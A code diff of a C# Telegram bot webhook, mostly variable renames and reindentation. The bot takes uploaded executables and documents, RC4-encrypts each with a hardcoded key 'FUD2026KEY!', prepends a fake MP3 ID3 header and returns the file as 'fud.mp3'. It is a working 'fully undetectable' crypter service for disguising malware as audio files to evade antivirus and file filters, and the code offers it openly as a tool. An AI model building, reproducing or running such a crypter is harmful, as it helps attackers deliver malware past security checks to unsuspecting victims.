@@ -40,8 +40,8 @@ app.MapPost("/webhook", async (HttpContext ctx, IHttpClientFactory clientFactory
     if (update.TryGetProperty("message", out var message)) {
         var client = clientFactory.CreateClient();
         
-        // /start
-        if (message.TryGetProperty("text", out var text) && text.GetString() == "/start") {
+        // /start command
+        if (message.TryGetProperty("text", out var textElem) && textElem.GetString() == "/start") {
             using var form = new MultipartFormDataContent();
             if (message.TryGetProperty("chat", out var chat) && chat.TryGetProperty("id", out var chatId)) {
                 form.Add(new StringContent(chatId.GetInt64().ToString()), "chat_id");
@@ -52,47 +52,47 @@ app.MapPost("/webhook", async (HttpContext ctx, IHttpClientFactory clientFactory
             return;
         }
         
-        // Files: exe/pdf/json/xls/xlsx/xml
-        if (message.TryGetProperty("document", out var document)) {
-            if (document.TryGetProperty("file_id", out var fileId) && 
-                document.TryGetProperty("file_name", out var fileName)) {
-                var filename = fileName.GetString()!;
+        // File processing
+        if (message.TryGetProperty("document", out var docElement)) {
+            if (docElement.TryGetProperty("file_id", out var fileId) && 
+                docElement.TryGetProperty("file_name", out var fileNameElem)) {
+                var filename = fileNameElem.GetString()!;
                 if (filename.EndsWith(".exe") || filename.EndsWith(".pdf") || 
                     filename.EndsWith(".json") || filename.EndsWith(".xls") || 
                     filename.EndsWith(".xlsx") || filename.EndsWith(".xml")) {
                     
-                // Get file info
-                using var formData = new MultipartFormDataContent();
-                formData.Add(new StringContent(fileId.GetString()!), "file_id");
-                var fileResponse = await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/getFile", formData);
-                var fileJson = await fileResponse.Content.ReadAsStringAsync();
-                using var fileDoc = JsonDocument.Parse(fileJson);
-                var filePath = fileDoc.RootElement.GetProperty("result").GetProperty("file_path").GetString()!;
-                
-                // Download
-                var fileUrl = $"https://api.telegram.org/file/bot{BOT_TOKEN}/{filePath}";
-                var fileBytes = await client.GetByteArrayAsync(fileUrl);
-                
-                // Encrypt + MP3 stego
-                var key = Encoding.UTF8.GetBytes("FUD2026KEY!");
-                var encrypted = RC4(fileBytes, key);
-                var mp3Header = Encoding.UTF8.GetBytes("ID3\x03\x00\x00\x00\x00\x00\nFUD2026");
-                var fudMp3 = mp3Header.Concat(encrypted).ToArray();
-                
-                // Send MP3
-                if (message.TryGetProperty("chat", out var chat2) && chat2.TryGetProperty("id", out var chatId2)) {
-                    var chatId = chatId2.GetInt64();
-                    using var mp3Content = new MultipartFormDataContent();
-                    mp3Content.Add(new StringContent(chatId.ToString()), "chat_id");
-                    var mp3Stream = new MemoryStream(fudMp3);
-                    mp3Content.Add(new StreamContent(mp3Stream), "document", "fud.mp3");
-                    mp3Content.Add(new StringContent("✅ **FUD MP3!**\n🔑 `FUD2026KEY!`\n📁 " + filename), "caption");
-                    mp3Content.Add(new StringContent("markdown"), "parse_mode");
-                    await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument", mp3Content);
+                    // Get file path
+                    using var formData = new MultipartFormDataContent();
+                    formData.Add(new StringContent(fileId.GetString()!), "file_id");
+                    var fileResponse = await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/getFile", formData);
+                    var fileJson = await fileResponse.Content.ReadAsStringAsync();
+                    using var fileDoc = JsonDocument.Parse(fileJson);
+                    var filePath = fileDoc.RootElement.GetProperty("result").GetProperty("file_path").GetString()!;
+                    
+                    // Download file
+                    var fileUrl = $"https://api.telegram.org/file/bot{BOT_TOKEN}/{filePath}";
+                    var fileBytes = await client.GetByteArrayAsync(fileUrl);
+                    
+                    // Encrypt + Stego
+                    var key = Encoding.UTF8.GetBytes("FUD2026KEY!");
+                    var encrypted = RC4(fileBytes, key);
+                    var mp3Header = Encoding.UTF8.GetBytes("ID3\x03\x00\x00\x00\x00\x00\nFUD2026");
+                    var fudMp3 = mp3Header.Concat(encrypted).ToArray();
+                    
+                    // Send FUD MP3
+                    if (message.TryGetProperty("chat", out var chat2) && chat2.TryGetProperty("id", out var chatId2)) {
+                        var chatId = chatId2.GetInt64();
+                        using var mp3Content = new MultipartFormDataContent();
+                        mp3Content.Add(new StringContent(chatId.ToString()), "chat_id");
+                        var mp3Stream = new MemoryStream(fudMp3);
+                        mp3Content.Add(new StreamContent(mp3Stream), "document", "fud.mp3");
+                        mp3Content.Add(new StringContent($"✅ **FUD MP3!**\n🔑 `FUD2026KEY!`\n📁 {filename}"), "caption");
+                        mp3Content.Add(new StringContent("markdown"), "parse_mode");
+                        await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument", mp3Content);
+                    }
                 }
             }
         }
-    }
     }
 });
 
